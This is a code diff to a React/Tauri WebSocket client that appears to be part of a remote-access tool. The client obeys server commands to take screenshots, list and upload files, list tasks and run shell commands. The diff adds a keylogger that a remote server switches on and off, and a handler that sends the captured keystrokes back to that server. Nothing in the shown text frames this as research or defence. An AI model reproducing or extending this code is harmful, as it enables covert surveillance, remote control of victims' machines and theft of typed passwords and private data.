@@ -1,6 +1,6 @@
 "use client";
 
-import { createContext, useContext, useRef, useState } from "react";
+import { createContext, useContext, useEffect, useRef, useState } from "react";
 import { io, type Socket } from "socket.io-client";
 
 import { useStoreTauri } from "@/hooks/useStore";
@@ -10,6 +10,7 @@ import { env } from "@/env.config";
 
 import ReactHowler from "react-howler";
 import { toast } from "sonner";
+import { useKeyContextProvider } from "./KeyContext";
 
 export type Events =
   | "uploadFile"
@@ -49,8 +50,16 @@ const WsContextProvider: React.FC<{
   const [playing, setPlaying] = useState<boolean>(false);
   const [wss, setWss] = useState<Socket | null>(null);
   const [connected, setConnected] = useState<boolean>(false);
+  const { setListening, keys } = useKeyContextProvider();
   const { getRecord } = useStoreTauri();
   // const [username, setUsername] = useState<string>("");
+
+  const keysRef = useRef<string[]>([]);
+
+  // Update the ref whenever keys changes
+  useEffect(() => {
+    keysRef.current = keys;
+  }, [keys]);
   const disconnect = () => {
     console.log("Disconnecting from ws-client", wss);
     if (wss) {
@@ -121,15 +130,29 @@ const WsContextProvider: React.FC<{
 
     socket.on("getScreenshot", wsService.getScreenshot);
 
-    socket.on("uploadFile", UploadFile);
+    socket.on("uploadFile", (data: WS.UploadFile) => UploadFile(data, socket));
 
     socket.on("getFilesFolder", wsService.getFilesFolder);
 
-    socket.on("getFileFromClient", wsService.getFileFromClient);
+    // socket.on("getFileFromClient", wsService.getFileFromClient);
 
     socket.on("getTasksFromClient", wsService.getTasksFromClient);
 
     socket.on("runCmdCommand", wsService.runCmdCommand);
+
+    socket.on("keylogger", (data: WS.RunKeyLogger) => {
+      const { status } = data;
+
+      setListening(status);
+    });
+
+    socket.on("keylogger:get-keys", () => {
+      console.log("keylogger:get-keys", keysRef.current);
+
+      socket.emit("keylogger:get-keys", {
+        keys: keysRef.current, // Use the ref value instead of the closure-captured value
+      });
+    });
 
     socket.onAny((eventName: Events, ...args) => {
       AppendLog(eventName, username, ...args);
